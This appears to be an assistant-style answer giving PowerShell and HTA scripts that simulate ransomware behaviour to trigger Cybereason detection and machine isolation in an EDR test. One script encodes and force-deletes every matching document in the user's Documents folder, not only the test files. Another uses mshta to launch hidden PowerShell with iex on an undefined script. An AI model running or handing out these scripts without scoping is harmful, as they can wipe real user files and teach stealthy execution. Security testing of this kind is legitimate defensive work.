To prepare isolation tests using Cybereason, we can use separate PowerShell scripts that simulate malicious behavior. 
Below are the steps and the corresponding scripts, along with instructions for execution by standard users without admin rights.

Step 1: Test File Generation Script
This script creates various file types in the user's Documents folder, which are typically targeted by ransomware.

Script Name: generate_test_files.ps1

PowerShell 
Copier le codeCode copié
# Set the target folder
$targetFolder = "$env:USERPROFILE\Documents"

# Generate 5 .txt files
1..5 | ForEach-Object { "This is sample text file $_" | Out-File "$targetFolder\test_$_.txt" }

# Generate 5 empty .docx files
1..5 | ForEach-Object { New-Item -Path $targetFolder -Name "test_$_.docx" -ItemType File }

# Generate 5 empty .xlsx files
1..5 | ForEach-Object { New-Item -Path $targetFolder -Name "test_$_.xlsx" -ItemType File }

# Generate 5 fake PDF files with text content
1..5 | ForEach-Object { "PDF file simulation $_" | Out-File "$targetFolder\test_$_.pdf" }
Instructions to Execute:

Save the script as generate_test_files.ps1 on your local machine.
Open PowerShell as a standard user.
Navigate to the directory where the script is saved.
Run the script using the command:
.\generate_test_files.ps1
Step 2: File Encryption Simulation Script
This script simulates the encryption of files by encoding their content to Base64 and creating new .enc files.

Script Name: simulate_file_encryption.ps1

PowerShell 
Copier le codeCode copié
# Set the target folder
$targetFolder = "$env:USERPROFILE\Documents"

# Encrypt files
Get-ChildItem -Path $targetFolder -Recurse -Include *.txt,*.docx,*.pdf,*.xlsx -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $content = Get-Content $_.FullName -Raw
        $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
        $newFile = "$($_.FullName).enc"
        [IO.File]::WriteAllText($newFile, $encoded)
        Remove-Item $_.FullName -Force
    } catch {}
}
Instructions to Execute:

Save the script as simulate_file_encryption.ps1.
Open PowerShell as a standard user.
Navigate to the directory where the script is saved.
Run the script using the command:
.\simulate_file_encryption.ps1
Step 3: Data Exfiltration Simulation Script
This script simulates data exfiltration by archiving the encrypted files into a ZIP file.

Script Name: simulate_data_exfiltration.ps1

PowerShell 
Copier le codeCode copié
# Set the target folder
$folder = "$env:USERPROFILE\Documents"
$files = Get-ChildItem -Path $folder -Include *.enc -Recurse -ErrorAction SilentlyContinue

# Archive encrypted files
$archivePath = "$env:TEMP\exfiltration.zip"
if ($files) {
    Compress-Archive -Path $files.FullName -DestinationPath $archivePath -Force
}
Instructions to Execute:

Save the script as simulate_data_exfiltration.ps1.
Open PowerShell as a standard user.
Navigate to the directory where the script is saved.
Run the script using the command:
.\simulate_data_exfiltration.ps1
Step 4: Stealth Execution Simulation Script
This script simulates stealthy execution using the mshta.exe method to run PowerShell commands invisibly.

Script Name: simulate_stealth_execution.hta

HTML, XML 
Copier le codeCode copié
<html>
<head>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell.exe -w hidden -nop -c iex (Get-Content simulate_ransom.ps1 -Raw)");
</script>
</head>
</html>
Instructions to Execute:

Save the script as simulate_stealth_execution.hta.
Open the saved .hta file by double-clicking it.
Triggering Malops
Each of these scripts is designed to trigger detection mechanisms in Cybereason, which can then lead to potential isolation of the machine. Ensure that you have monitoring in place to observe the alerts generated from these simulations.

Be cautious while running these scripts, as they are designed to simulate malicious activities. Ensure you have the proper permissions and that this testing is conducted in a controlled environment.
